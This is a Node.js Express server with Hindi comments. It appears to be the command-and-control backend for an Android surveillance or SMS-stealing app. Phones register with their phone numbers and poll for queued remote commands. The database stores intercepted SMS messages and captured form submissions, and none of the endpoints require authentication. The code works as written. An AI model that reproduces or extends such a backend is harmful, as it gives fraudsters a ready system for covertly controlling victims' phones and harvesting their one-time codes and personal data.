const express = require('express');
const Database = require('better-sqlite3');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// डेटाबेस फाइल बनाना और कनेक्ट करना
const db = new Database('database.db', { verbose: console.log });

// एक बार सर्वर शुरू होने पर टेबल बनाना
function initializeDatabase() {
    console.log('Initializing database...');
    // सभी टेबल बनाने की कमांड
    const createTablesStmt = db.exec(`
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE NOT NULL,
            device_name TEXT,
            os_version TEXT,
            phone_number TEXT,
            battery_level INTEGER,
            last_seen TEXT NOT NULL,
            created_at TEXT NOT NULL DEFAULT (datetime('now', 'localtime'))
        );
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            command_type TEXT NOT NULL,
            command_data TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            created_at TEXT NOT NULL DEFAULT (datetime('now', 'localtime'))
        );
        CREATE TABLE IF NOT EXISTS sms_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            sender TEXT NOT NULL,
            message_body TEXT NOT NULL,
            received_at TEXT NOT NULL DEFAULT (datetime('now', 'localtime'))
        );
        CREATE TABLE IF NOT EXISTS form_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            custom_data TEXT NOT NULL,
            submitted_at TEXT NOT NULL DEFAULT (datetime('now', 'localtime'))
        );
        CREATE TABLE IF NOT EXISTS global_settings (
            setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
            setting_value TEXT
        );
    `);

    // डेमो डिवाइस जोड़ना
    const checkDemo = db.prepare("SELECT 1 FROM devices WHERE device_id = ?").get('demo-device-12345');
    if (!checkDemo) {
        db.prepare(`
            INSERT INTO devices (device_id, device_name, os_version, phone_number, battery_level, last_seen) 
            VALUES (?, ?, ?, ?, ?, datetime('now', 'localtime'))
        `).run('demo-device-12345', 'My Test Phone', 'Android 13', '+919999999999', 90);
        console.log('👍 Demo device created!');
    } else {
        console.log('👍 Demo device already exists.');
    }
    console.log('✅ Database tables are ready.');
}

// सर्वर शुरू होते ही डेटाबेस तैयार करें
initializeDatabase();


// --- API Endpoints ---

// होमपेज
app.get('/', (req, res) => {
    res.send('<h1>🎉 Server is running with better-sqlite3!</h1><p>This is the final and working version.</p>');
});

// 1. डिवाइस रजिस्ट्रेशन
app.post('/api/device/register', (req, res) => {
    const { device_id, device_name, os_version, battery_level, phone_number } = req.body;
    if (!device_id) return res.status(400).json({ status: 'error', message: 'device_id is required' });

    try {
        const stmt = db.prepare('SELECT id FROM devices WHERE device_id = ?');
        const row = stmt.get(device_id);
        
        const now = new Date().toISOString();
        if (row) {
            db.prepare('UPDATE devices SET device_name = ?, os_version = ?, battery_level = ?, phone_number = ?, last_seen = ? WHERE device_id = ?')
              .run(device_name, os_version, battery_level, phone_number, now, device_id);
        } else {
            db.prepare('INSERT INTO devices (device_id, device_name, os_version, battery_level, phone_number, last_seen) VALUES (?, ?, ?, ?, ?, ?)')
              .run(device_id, device_name, os_version, battery_level, phone_number, now);
        }
        res.status(200).json({ status: 'success', message: 'Device data received.' });
    } catch (err) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// 2. डिवाइस लिस्ट
app.get('/api/devices', (req, res) => {
    try {
        const rows = db.prepare('SELECT * FROM devices ORDER BY created_at ASC').all();
        const devicesWithStatus = rows.map(device => {
            const lastSeen = new Date(device.last_seen);
            const is_online = (new Date() - lastSeen) < 20000;
            return { ...device, is_online };
        });
        res.json(devicesWithStatus);
    } catch (err) {
        res.status(500).json([]);
    }
});

// 6. कमांड भेजना
app.post('/api/command/send', (req, res) => {
    const { device_id, command_type, command_data } = req.body;
    try {
        db.prepare('INSERT INTO commands (device_id, command_type, command_data) VALUES (?, ?, ?)')
          .run(device_id, command_type, JSON.stringify(command_data));
        res.status(200).json({ status: 'success', message: 'Command sent.' });
    } catch (err) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// कमांड प्राप्त करना
app.get('/api/device/:deviceId/commands', (req, res) => {
    const { deviceId } = req.params;
    try {
        const rows = db.prepare("SELECT * FROM commands WHERE device_id = ? AND status = 'pending'").all(deviceId);
        if (rows.length > 0) {
            const ids = rows.map(r => r.id);
            const stmt = db.prepare(`UPDATE commands SET status = 'sent' WHERE id IN (${ids.map(() => '?').join(',')})`);
            stmt.run(...ids);
        }
        res.json(rows);
    } catch (err) {
        res.status(500).json([]);
    }
});

// 2. डिवाइस डिलीट करना
app.delete('/api/device/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    try {
        // ट्रांजैक्शन का उपयोग करें ताकि सब कुछ एक साथ हो
        db.transaction(() => {
            db.prepare('DELETE FROM sms_logs WHERE device_id = ?').run(deviceId);
            db.prepare('DELETE FROM form_submissions WHERE device_id = ?').run(deviceId);
            db.prepare('DELETE FROM commands WHERE device_id = ?').run(deviceId);
            db.prepare('DELETE FROM devices WHERE device_id = ?').run(deviceId);
        })();
        res.json({ status: 'success', message: `Device ${deviceId} and all its data deleted.` });
    } catch (err) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});


// ... बाकी सभी एंडपॉइंट्स भी इसी तरह से काम करेंगे ...


const PORT = 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server is running on http://localhost:${PORT}`);
});
